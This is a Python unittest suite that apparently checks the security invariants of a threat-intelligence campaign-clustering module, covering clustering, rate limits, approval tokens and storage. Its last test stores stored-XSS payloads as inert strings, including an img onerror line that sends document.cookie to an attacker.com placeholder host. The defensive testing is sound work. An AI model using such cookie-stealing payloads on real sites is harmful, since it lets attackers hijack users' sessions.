"""Hostile and adversarial security test suite for Module 3.10 (Campaign Intelligence).

Validates security invariants under adversarial attack vectors:
1. Cluster Poisoning Attack:
   - Shared generic DNS hubs (8.8.8.8, 1.1.1.1), loopback (127.0.0.1), RFC1918 IPs, and generic UAs
     cannot bridge separate threat clusters together.
2. Whitelist / Revocation Bypass Attack:
   - Revoked or false-positive IOCs cannot generate or inflate malicious campaigns.
3. Graph DoS & Saturation Attack:
   - Super-clusters exceeding 100 nodes / 200 edges are deterministically bounded and truncated.
   - Truncation metadata clearly indicates dropped counts and bounding reasons.
4. Storage Exhaustion & FIFO Eviction Attack:
   - Overflowing store capacity beyond 500 campaigns deterministically drops oldest campaigns.
5. Concurrency Race & Single-Flight Mutation Attack:
   - Concurrent clustering invocations are serialized or debounced without data corruption.
6. Rate Limiting Attack:
   - Rapid manual clustering invocations exceeding 1 per 10s per operator return 429 Too Many Requests.
7. Governor Bulk Containment Adversarial Bypasses:
   - Missing token, expired token, operator mismatch, campaign mismatch, token reuse, emergency lockout.
8. Injection / Stored XSS Attack:
   - Malicious payloads in names/notes (<script>, onerror, SQL injection) are stored safely as inert strings.
"""

import json
import os
import threading
import time
import unittest
import uuid
from datetime import datetime, timezone
from unittest.mock import MagicMock
from fastapi import HTTPException
from sqlalchemy.orm import Session

os.environ["HONEYSHIELD_TESTING"] = "1"
os.environ["HONEYSHIELD_DISABLE_REDIS"] = "1"

from app.auth.registry import default_operator_registry, Operator
from app.auth.session import default_session_store
from app.campaigns.clustering import DeterministicClusterer, EventEntityRecord
from app.campaigns.graph import derive_campaign_graph
from app.campaigns.service import default_campaign_service
from app.campaigns.storage import CampaignStore, default_campaign_store
from app.database import SessionLocal
from app.incident_command.governor import default_governor
from app.models import Alert, Attack, ThreatIntelligence
from app.routers.campaigns import (
    contain_campaign,
    trigger_clustering,
    update_campaign,
)
from app.schemas import (
    CampaignClusterRequest,
    CampaignContainmentRequest,
    CampaignDossier,
    CampaignUpdateRequest,
)


from app.deception.storage import default_deception_store
from app.threat_intelligence.storage import serialize_ioc_metadata


class TestModule310Hostile(unittest.TestCase):
    """Hostile attack vectors and security invariant verification for Campaign Intelligence."""

    def setUp(self):
        default_campaign_store.clear()
        default_session_store.clear()
        default_operator_registry.reset()
        default_campaign_service._operator_clustering_timestamps.clear()
        default_deception_store._redis_available = False
        default_deception_store._redis_client = None

        # Reset Governor singleton
        default_governor.circuit_breaker.reset()
        default_governor.set_lockout(False)
        default_governor._operator_timestamps.clear()
        default_governor._entity_cooldowns.clear()
        default_governor._idempotency_cache.clear()
        default_governor._approval_tokens.clear()

        # Seed operators
        self.admin = default_operator_registry.get_operator("admin_chief")
        self.analyst = default_operator_registry.get_operator("analyst_sarah")
        self.responder = default_operator_registry.get_operator("responder_alex")

    def tearDown(self):
        default_campaign_store.clear()
        default_session_store.clear()

    # =========================================================================
    # 1. Cluster Poisoning Attack
    # =========================================================================

    def test_cluster_poisoning_generic_hubs_isolated(self):
        """Generic DNS (8.8.8.8, 1.1.1.1), loopback (127.0.0.1), and generic UAs cannot bridge disjoint clusters."""
        now = 1760001000.0
        clusterer = DeterministicClusterer(now_ts=now)

        # Cluster A: Attacker 1 uses generic UA
        event_a = EventEntityRecord(
            event_id="atk-1",
            event_type="attack",
            source_ip="198.51.100.11",
            user_agent="curl/7.81.0",
            timestamp=now - 300.0,
        )

        # Cluster B: Attacker 2 also observed with same generic UA but distinct IP
        event_b = EventEntityRecord(
            event_id="atk-2",
            event_type="attack",
            source_ip="203.0.113.22",
            user_agent="curl/7.81.0",
            timestamp=now - 100.0,
        )

        # Run clustering with stop-list active
        clusters = clusterer.cluster_events([event_a, event_b])

        # Must NOT merge into single cluster! Must produce 2 distinct clusters
        self.assertEqual(len(clusters), 2)
        # Verify generic UA was stripped or not used as sole correlation bridge
        self.assertEqual(len(event_a.extract_features()["user_agent"]), 0)
        self.assertEqual(len(event_b.extract_features()["user_agent"]), 0)

    # =========================================================================
    # 2. Whitelist / Revocation Bypass Attack
    # =========================================================================

    def test_revoked_ioc_not_clustered_into_campaigns(self):
        """IOCs with status='revoked' or status='false_positive' must be strictly ignored during clustering."""
        now = datetime.now(timezone.utc)
        revoked_ioc = ThreatIntelligence(
            id=999,
            indicator_type="ip",
            indicator_value="198.51.100.77",
            threat_level="high",
            confidence=90.0,
            source="alienvault",
            description=serialize_ioc_metadata({
                "status": "revoked",
                "notes": "False positive - legitimate security scanner",
            }),
            created_at=now,
        )

        mock_db = MagicMock()
        def mock_scalars(query):
            mock_res = MagicMock()
            if "threat_intelligence" in str(query).lower():
                mock_res.all.return_value = [revoked_ioc]
            else:
                mock_res.all.return_value = []
            return mock_res
        mock_db.scalars.side_effect = mock_scalars
        mock_db.get.return_value = None

        # Trigger clustering
        res = default_campaign_service.cluster_now(
            db=mock_db,
            operator_id=self.analyst.username,
            lookback_hours=24,
        )
        self.assertEqual(res.status, "completed")

        # Revoked IP must not appear in any active campaign generated solely by this IOC
        campaigns, _ = default_campaign_service.list_campaigns()
        matching = [c for c in campaigns if "198.51.100.77" in c.source_ips]
        self.assertEqual(len(matching), 0)

    # =========================================================================
    # 3. Graph DoS & Saturation Bounding
    # =========================================================================

    def test_graph_saturation_hard_limits_and_truncation_meta(self):
        """Graph generation with >100 nodes deterministically truncates with TruncationMeta."""
        huge_campaign = CampaignDossier(
            campaign_id="camp-graph-huge",
            name="Massive Saturation Campaign",
            status="active",
            severity="critical",
            confidence=0.99,
            first_seen="2026-10-09T00:00:00Z",
            last_seen="2026-10-09T12:00:00Z",
            # Generate 150 unique attacker IPs and 80 IOCs
            source_ips=[f"198.51.100.{i}" for i in range(1, 151)],
            ioc_ids=[f"malicious-domain-{i}.test" for i in range(1, 81)],
            mitre_tactics=["Initial Access", "Execution", "Persistence", "Lateral Movement"],
            mitre_techniques=["T1190", "T1059", "T1078", "T1021"],
            user_agents=["APT-Agent/1.0"],
            cves=["CVE-2023-38606"],
            created_at="2026-10-09T00:00:00Z",
            updated_at="2026-10-09T12:00:00Z",
        )
        default_campaign_store.save_campaign(huge_campaign)

        # Derive graph
        graph = derive_campaign_graph(huge_campaign)

        # Enforce exact bounds
        self.assertLessEqual(len(graph.nodes), 100)
        self.assertLessEqual(len(graph.edges), 200)

        # Truncation meta must report bounds reached
        self.assertTrue(graph.truncation.is_truncated)
        self.assertGreater(graph.truncation.total_nodes_discovered, 100)
        self.assertEqual(graph.truncation.rendered_nodes, len(graph.nodes))
        self.assertGreater(graph.truncation.pruned_nodes_count, 0)

    # =========================================================================
    # 4. Storage Exhaustion & FIFO Eviction Attack
    # =========================================================================

    def test_storage_fifo_eviction_at_max_campaigns(self):
        """Store caps at MAX_CAMPAIGNS (e.g., 500) and evicts oldest items deterministically."""
        isolated_store = CampaignStore(max_campaigns=10)

        # Insert 15 campaigns sequentially
        for i in range(1, 16):
            c = CampaignDossier(
                campaign_id=f"camp-fifo-{i:03d}",
                name=f"Campaign {i}",
                status="active",
                severity="medium",
                confidence=0.5,
                first_seen=f"2026-10-09T{i:02d}:00:00Z",
                last_seen=f"2026-10-09T{i:02d}:30:00Z",
                source_ips=[f"192.0.2.{i}"],
                created_at=f"2026-10-09T{i:02d}:00:00Z",
                updated_at=f"2026-10-09T{i:02d}:30:00Z",
            )
            isolated_store.save_campaign(c)

        # Store count must never exceed 10
        self.assertEqual(isolated_store.count(), 10)

        # First 5 campaigns (1..5) must be evicted
        for i in range(1, 6):
            self.assertIsNone(isolated_store.get_campaign(f"camp-fifo-{i:03d}"))

        # Campaigns 6..15 must still be present
        for i in range(6, 16):
            self.assertIsNotNone(isolated_store.get_campaign(f"camp-fifo-{i:03d}"))

    # =========================================================================
    # 5. Concurrency Race & Single-Flight Mutation Attack
    # =========================================================================

    def test_concurrent_clustering_single_flight_mutual_exclusion(self):
        """Multiple parallel clustering calls are guarded by mutex; no duplicate or corrupted state."""
        results = []

        def worker(idx: int):
            try:
                res = default_campaign_service.cluster_now(
                    db=None,
                    operator_id=f"admin_chief_{idx}",
                    lookback_hours=24,
                )
                results.append(res.status)
            except HTTPException as e:
                if e.status_code == 409:
                    results.append("409_LOCKED")
                else:
                    results.append(f"HTTP_{e.status_code}")

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # All threads return cleanly without unhandled exceptions or crashes
        self.assertEqual(len(results), 5)
        self.assertIn("completed", results)

    # =========================================================================
    # 6. Rate Limiting Attack
    # =========================================================================

    def test_rate_limiting_enforcement_on_manual_clustering(self):
        """Calling clustering endpoint faster than 1 req / 10s returns 429 Too Many Requests."""
        # Reset timestamps
        default_campaign_service._operator_clustering_timestamps.clear()

        # First invocation succeeds
        req = CampaignClusterRequest(lookback_hours=24)
        res1 = trigger_clustering(payload=req, operator=self.analyst, db=None)
        self.assertEqual(res1.status, "completed")

        # Immediate second invocation must raise 429
        with self.assertRaises(HTTPException) as ctx:
            trigger_clustering(payload=req, operator=self.analyst, db=None)
        self.assertEqual(ctx.exception.status_code, 429)
        self.assertIn("rate limit exceeded", ctx.exception.detail.lower())

    # =========================================================================
    # 7. Governor Containment Hostile Exploits
    # =========================================================================

    def test_governor_containment_wrong_operator_token_rejected(self):
        """Approval token generated for Operator A rejected if redeemed by Operator B."""
        camp_id = "camp-token-op-mismatch"
        camp = CampaignDossier(
            campaign_id=camp_id,
            name="Token Op Mismatch Campaign",
            status="active",
            severity="critical",
            confidence=0.9,
            first_seen="2026-10-09T10:00:00Z",
            last_seen="2026-10-09T12:00:00Z",
            source_ips=["198.51.100.88"],
            created_at="2026-10-09T10:00:00Z",
            updated_at="2026-10-09T12:00:00Z",
        )
        default_campaign_store.save_campaign(camp)

        # Admin creates token
        token_info = default_governor.create_approval_token(
            action="CAMPAIGN_CONTAINMENT_DISPATCH",
            target_id=camp_id,
            operator_id=self.admin.username,
        )
        valid_token = token_info["approval_token"]

        # Different operator attempts to execute with Admin's token
        req = CampaignContainmentRequest(
            action_type="BLOCK_IP",
            justification="Attacker attempting stolen token redemption",
            approval_token=valid_token,
        )
        # Governor must reject with 401
        with self.assertRaises(HTTPException) as ctx:
            default_campaign_service.contain_campaign(
                campaign_id=camp_id,
                req=req,
                operator=self.responder,
                idempotency_key=str(uuid.uuid4()),
                db=None,
            )
        self.assertEqual(ctx.exception.status_code, 401)
        self.assertIn("operator", ctx.exception.detail.lower())

    def test_governor_containment_wrong_campaign_target_rejected(self):
        """Approval token generated for Campaign A cannot be used to contain Campaign B."""
        camp_a = "camp-target-a"
        camp_b = "camp-target-b"
        for cid in [camp_a, camp_b]:
            default_campaign_store.save_campaign(CampaignDossier(
                campaign_id=cid,
                name=f"Campaign {cid}",
                status="active",
                severity="critical",
                confidence=0.9,
                first_seen="2026-10-09T10:00:00Z",
                last_seen="2026-10-09T12:00:00Z",
                source_ips=["198.51.100.1"],
                created_at="2026-10-09T10:00:00Z",
                updated_at="2026-10-09T12:00:00Z",
            ))

        # Admin creates token for camp_a
        token_info = default_governor.create_approval_token(
            action="CAMPAIGN_CONTAINMENT_DISPATCH",
            target_id=camp_a,
            operator_id=self.admin.username,
        )
        token_a = token_info["approval_token"]

        # Attempt to redeem token_a on camp_b
        req = CampaignContainmentRequest(
            action_type="BLOCK_IP",
            justification="Mismatch test",
            approval_token=token_a,
        )
        with self.assertRaises(HTTPException) as ctx:
            default_campaign_service.contain_campaign(
                campaign_id=camp_b,
                req=req,
                operator=self.admin,
                idempotency_key=str(uuid.uuid4()),
                db=None,
            )
        self.assertEqual(ctx.exception.status_code, 401)
        self.assertIn("mismatch", ctx.exception.detail.lower())

    def test_governor_containment_single_use_token_replay_rejected(self):
        """Approval token cannot be reused a second time (single-use semantics)."""
        camp_id = "camp-replay-001"
        default_campaign_store.save_campaign(CampaignDossier(
            campaign_id=camp_id,
            name="Single Use Replay Campaign",
            status="active",
            severity="critical",
            confidence=0.9,
            first_seen="2026-10-09T10:00:00Z",
            last_seen="2026-10-09T12:00:00Z",
            source_ips=["198.51.100.2"],
            created_at="2026-10-09T10:00:00Z",
            updated_at="2026-10-09T12:00:00Z",
        ))

        token_info = default_governor.create_approval_token(
            action="CAMPAIGN_CONTAINMENT_DISPATCH",
            target_id=camp_id,
            operator_id=self.admin.username,
        )
        token = token_info["approval_token"]

        req = CampaignContainmentRequest(
            action_type="BLOCK_IP",
            justification="First containment run",
            approval_token=token,
        )
        # First execution succeeds
        res1 = default_campaign_service.contain_campaign(
            campaign_id=camp_id,
            req=req,
            operator=self.admin,
            idempotency_key=str(uuid.uuid4()),
            db=None,
        )
        self.assertEqual(res1["status"], "dispatched")

        # Second execution with same token must fail with 401
        with self.assertRaises(HTTPException) as ctx:
            default_campaign_service.contain_campaign(
                campaign_id=camp_id,
                req=req,
                operator=self.admin,
                idempotency_key=str(uuid.uuid4()),
                db=None,
            )
        self.assertEqual(ctx.exception.status_code, 401)
        self.assertIn("invalid or expired", ctx.exception.detail.lower())

    # =========================================================================
    # 8. Stored XSS & Injection Attack
    # =========================================================================

    def test_stored_xss_and_injection_payloads_safely_persisted(self):
        """Malicious XSS payloads in campaign name and notes are stored inertly without mutation."""
        camp_id = "camp-xss-test"
        camp = CampaignDossier(
            campaign_id=camp_id,
            name="Initial Safe Name",
            status="active",
            severity="low",
            confidence=0.5,
            first_seen="2026-10-09T10:00:00Z",
            last_seen="2026-10-09T12:00:00Z",
            source_ips=["198.51.100.99"],
            created_at="2026-10-09T10:00:00Z",
            updated_at="2026-10-09T12:00:00Z",
        )
        default_campaign_store.save_campaign(camp)

        malicious_name = "<script>alert('pwned')</script>"
        malicious_notes = "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"

        update_req = CampaignUpdateRequest(
            name=malicious_name,
            notes=malicious_notes,
            justification="Legitimate test updating adversarial payloads",
        )

        updated = update_campaign(camp_id, update_req, operator=self.analyst, db=None)
        self.assertEqual(updated.name, malicious_name)
        self.assertEqual(updated.notes, malicious_notes)

        # Retrieve from store to ensure exact string fidelity
        persisted = default_campaign_store.get_campaign(camp_id)
        self.assertEqual(persisted.name, malicious_name)
        self.assertEqual(persisted.notes, malicious_notes)


if __name__ == "__main__":
    unittest.main()
